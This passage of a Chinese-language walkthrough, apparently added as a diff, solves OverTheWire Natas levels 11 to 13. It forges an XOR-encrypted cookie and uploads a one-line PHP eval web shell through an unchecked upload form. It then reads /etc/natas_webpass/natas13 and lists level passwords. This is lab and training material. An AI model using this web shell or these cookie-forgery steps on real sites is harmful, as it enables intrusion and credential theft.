+
+<ul>
+<li>可以通过表单提交并设置背景颜色，提示：<em>Cookies 受异或加密保护</em> ？<br>
+<img alt="Cookies are protected with XOR encryption" src="img/natas21.jpg" /></li>
+<li>查看网页源代码，了解到需要通过 <em>Cookie</em> 设置<code>showpassword</code>的值为<code>yes</code>
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span>
+<span class="normal">66</span>
+<span class="normal">67</span>
+<span class="normal">68</span>
+<span class="normal">69</span>
+<span class="normal">70</span>
+<span class="normal">71</span>
+<span class="normal">72</span>
+<span class="normal">73</span>
+<span class="normal">74</span>
+<span class="normal">75</span>
+<span class="normal">76</span>
+<span class="normal">77</span>
+<span class="normal">78</span>
+<span class="normal">79</span>
+<span class="normal">80</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+
+<span class="cp"># 变量 $defaultdata 中 showpassword 的初始值为 no</span>
+<span class="cp">$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span>
+
+<span class="cp">function xor_encrypt($in) {</span>
+<span class="cp">    $key = &#39;&lt;censored&gt;&#39;;</span>
+<span class="cp">    $text = $in;</span>
+<span class="cp">    $outText = &#39;&#39;;</span>
+
+<span class="cp">    // Iterate through each character</span>
+<span class="cp">    for($i=0;$i&lt;strlen($text);$i++) {</span>
+<span class="cp">    # 异或运算，可通过将输入和输出异或得到变量 $key</span>
+<span class="cp">    $outText .= $text[$i] ^ $key[$i % strlen($key)];</span>
+<span class="cp">    }</span>
+
+<span class="cp">    return $outText;</span>
+<span class="cp">}</span>
+
+<span class="cp">function loadData($def) {</span>
+<span class="cp">    # HTTP 请求头中包含的 Cookie 主要用于传递 showpassword 的值</span>
+<span class="cp">    global $_COOKIE;</span>
+<span class="cp">    $mydata = $def;</span>
+<span class="cp">    if(array_key_exists(&quot;data&quot;, $_COOKIE)) {</span>
+<span class="cp">    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);</span>
+<span class="cp">    if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) {</span>
+<span class="cp">        if (preg_match(&#39;/^#(?:[a-f\d]{6})$/i&#39;, $tempdata[&#39;bgcolor&#39;])) {</span>
+<span class="cp">        $mydata[&#39;showpassword&#39;] = $tempdata[&#39;showpassword&#39;];</span>
+<span class="cp">        $mydata[&#39;bgcolor&#39;] = $tempdata[&#39;bgcolor&#39;];</span>
+<span class="cp">        }</span>
+<span class="cp">    }</span>
+<span class="cp">    }</span>
+<span class="cp">    return $mydata;</span>
+<span class="cp">}</span>
+
+<span class="cp"># 保存到 Cookie 中</span>
+<span class="cp">function saveData($d) {</span>
+<span class="cp">    setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));</span>
+<span class="cp">}</span>
+
+<span class="cp"># 将 Cookie 的值经过 Base64 解码、与密钥异或并转化为 json 格式赋值给变量 $data</span>
+<span class="cp">$data = loadData($defaultdata);</span>
+
+<span class="cp"># 接收通过 GET 请求（表单）提交的背景颜色并设置</span>
+<span class="cp">if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) {</span>
+<span class="cp">    if (preg_match(&#39;/^#(?:[a-f\d]{6})$/i&#39;, $_REQUEST[&#39;bgcolor&#39;])) {</span>
+<span class="cp">        $data[&#39;bgcolor&#39;] = $_REQUEST[&#39;bgcolor&#39;];</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+
+<span class="cp">saveData($data);</span>
+
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas11<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;background: &lt;?=$data[&#39;bgcolor&#39;]?&gt;;&quot;</span><span class="p">&gt;</span>
+Cookies are protected with XOR encryption<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+
+<span class="cp">&lt;?</span>
+<span class="cp"># 需要得到包含 $data[&quot;showpassword&quot;] == &quot;yes&quot; 对应的 Cookie</span>
+<span class="cp">if($data[&quot;showpassword&quot;] == &quot;yes&quot;) {</span>
+<span class="cp">    print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;;</span>
+<span class="cp">}</span>
+
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+Background color: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">bgcolor</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&lt;?=$data[&#39;bgcolor&#39;]?&gt;&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Set color&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>直接提交表单，获得变量<code>$defaultdata</code>对应的 <em>Cookie</em><br>
+<img alt="data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=" src="img/natas22.jpg" /></li>
+<li>通过异或获得变量<code>$key</code>的值
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="c1"># calc.php</span>
+<span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;no&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&quot;</span><span class="p">;</span>
+
+<span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span> <span class="nv">$out</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$in</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$out</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$out</span><span class="p">)];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">));</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+</td></tr></table></li>
+<li>循环节长度为 4，轻松获得<code>$key</code>值：<em>qw8J</em>
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>$ php -f calc.php
+qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+</code></pre></div>
+</td></tr></table></li>
+<li>接下来获取目标 <em>Cookie</em>
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>$ php -f calc.php
+ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+</code></pre></div>
+</td></tr></table>
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="c1"># calc.php</span>
+<span class="nv">$targetdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;yes&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;qw8J&#39;</span><span class="p">;</span>
+    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
+    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$targetdata</span><span class="p">)));</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+</td></tr></table></li>
+<li>编辑原 HTTP 请求头中的 <em>Cookie</em> 的值，并再次发送，成功获取下一关口令<br>
+<img alt="EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3" src="img/natas23.jpg" /></li>
+</ul>
+<h2 id="level-12">Level 12<a class="headerlink" href="#level-12" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas12</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas12.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>表单：上传 JPEG 文件<br>
+<img alt="Choose a JPEG to upload (max 1KB)" src="img/natas24.jpg" /></li>
+<li>查看源代码，注意到并没有对上传文件进行类型检查（包括文件后缀名），上传到服务器后，文件名是随机生成的字符串，文件后缀名则由前端直接定义
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas12<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+
+<span class="cp"># 生成长度为 10 的随机字符串</span>
+<span class="cp">function genRandomString() {</span>
+<span class="cp">    $length = 10;</span>
+<span class="cp">    $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;</span>
+<span class="cp">    $string = &quot;&quot;;</span>
+
+<span class="cp">    for ($p = 0; $p &lt; $length; $p++) {</span>
+<span class="cp">        $string .= $characters[mt_rand(0, strlen($characters)-1)];</span>
+<span class="cp">    }</span>
+
+<span class="cp">    return $string;</span>
+<span class="cp">}</span>
+
+<span class="cp">function makeRandomPath($dir, $ext) {</span>
+<span class="cp">    do {</span>
+<span class="cp">    $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;</span>
+<span class="cp">    } while(file_exists($path));</span>
+<span class="cp">    return $path;</span>
+<span class="cp">}</span>
+
+<span class="cp">function makeRandomPathFromFilename($dir, $fn) {</span>
+<span class="cp">    # 获得传入路径字符串中的文件扩展名</span>
+<span class="cp">    $ext = pathinfo($fn, PATHINFO_EXTENSION);</span>
+<span class="cp">    return makeRandomPath($dir, $ext);</span>
+<span class="cp">}</span>
+
+<span class="cp">if(array_key_exists(&quot;filename&quot;, $_POST)) {</span>
+<span class="cp">    $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);</span>
+<span class="cp">    if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &gt; 1000) {</span>
+<span class="cp">        echo &quot;File is too big&quot;;</span>
+<span class="cp">    }</span>
+<span class="cp">    else {</span>
+<span class="cp">        if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) {</span>
+<span class="cp">            echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;</span>
+<span class="cp">        } else{</span>
+<span class="cp">            echo &quot;There was an error uploading the file, please try again!&quot;;</span>
+<span class="cp">        }</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+<span class="cp">else {</span>
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;multipart/form-data&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;MAX_FILE_SIZE&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1000&quot;</span> <span class="p">/&gt;</span>
+<span class="c">&lt;!-- 直接定义文件后缀名。此处显示的文件名无效 --&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;filename&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot;</span> <span class="p">/&gt;</span>
+Choose a JPEG to upload (max 1KB):<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;uploadedfile&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Upload File&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="cp">&lt;? } ?&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>创建并编辑文件<code>hack.php</code>
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+</td></tr></table></li>
+<li>修改前端表单，将文件后缀<code>jpg</code>改为<code>php</code>，并上传文件<code>hack.php</code><br>
+<img alt="修改 input 标签的值" src="img/natas25.jpg" /></li>
+<li>保存文件链接<br>
+<img alt="http://natas12.natas.labs.overthewire.org/upload/6uf64xwhpq.php" src="img/natas26.jpg" /></li>
+<li>先使用中国菜刀浏览器访问 <a href="http://natas12.natas.labs.overthewire.org">http://natas12.natas.labs.overthewire.org</a>，完成身份验证</li>
+<li>添加SHELL<br>
+<img alt="添加SHELL" src="img/natas27.jpg" /></li>
+<li>进入文件系统后，找到<code>/etc/natas_webpass/natas13</code>即可<br>
+<img alt="jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY" src="img/natas28.jpg" /></li>
+</ul>
+<h2 id="level-13">Level 13<a class="headerlink" href="#level-13" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas13</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas13.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>页面提示只接收图片文件<br>
+<img alt="For security reasons, we now only accept image files!" src="img/natas29.jpg" /></li>
+<li>源码中使用<code>exif_imagetype</code>函数判断上传的文件是否为图片（返回 FALSE 或图片类型），<code>exif_imagetype</code>通过读取文件的第一个字节进行判断
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span>
+<span class="normal">66</span>
+<span class="normal">67</span>
+<span class="normal">68</span>
+<span class="normal">69</span>
+<span class="normal">70</span>
+<span class="normal">71</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas13<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+For security reasons, we now only accept image files!<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+
+<span class="cp">&lt;?</span>
+
+<span class="cp">function genRandomString() {</span>
+<span class="cp">    $length = 10;</span>
+<span class="cp">    $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;</span>
+<span class="cp">    $string = &quot;&quot;;</span>
+
+<span class="cp">    for ($p = 0; $p &lt; $length; $p++) {</span>
+<span class="cp">        $string .= $characters[mt_rand(0, strlen($characters)-1)];</span>
+<span class="cp">    }</span>
+
+<span class="cp">    return $string;</span>
+<span class="cp">}</span>
+
+<span class="cp">function makeRandomPath($dir, $ext) {</span>
+<span class="cp">    do {</span>
+<span class="cp">    $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;</span>
+<span class="cp">    } while(file_exists($path));</span>
+<span class="cp">    return $path;</span>
+<span class="cp">}</span>
+
+<span class="cp">function makeRandomPathFromFilename($dir, $fn) {</span>
+<span class="cp">    $ext = pathinfo($fn, PATHINFO_EXTENSION);</span>
+<span class="cp">    return makeRandomPath($dir, $ext);</span>
+<span class="cp">}</span>
+
+<span class="cp">if(array_key_exists(&quot;filename&quot;, $_POST)) {</span>
+<span class="cp">    $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);</span>
+
+<span class="cp">    $err=$_FILES[&#39;uploadedfile&#39;][&#39;error&#39;];</span>
+<span class="cp">    if($err){</span>
+<span class="cp">        if($err === 2){</span>
+<span class="cp">            echo &quot;The uploaded file exceeds MAX_FILE_SIZE&quot;;</span>
+<span class="cp">        } else{</span>
+<span class="cp">            echo &quot;Something went wrong :/&quot;;</span>
+<span class="cp">        }</span>
+<span class="cp">    } else if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &gt; 1000) {</span>
+<span class="cp">        echo &quot;File is too big&quot;;</span>
+<span class="cp">    } else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) {</span>
+<span class="cp">        echo &quot;File is not an image&quot;;</span>
+<span class="cp">    } else {</span>
+<span class="cp">        if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) {</span>
+<span class="cp">            echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;</span>
+<span class="cp">        } else{</span>
+<span class="cp">            echo &quot;There was an error uploading the file, please try again!&quot;;</span>
+<span class="cp">        }</span>
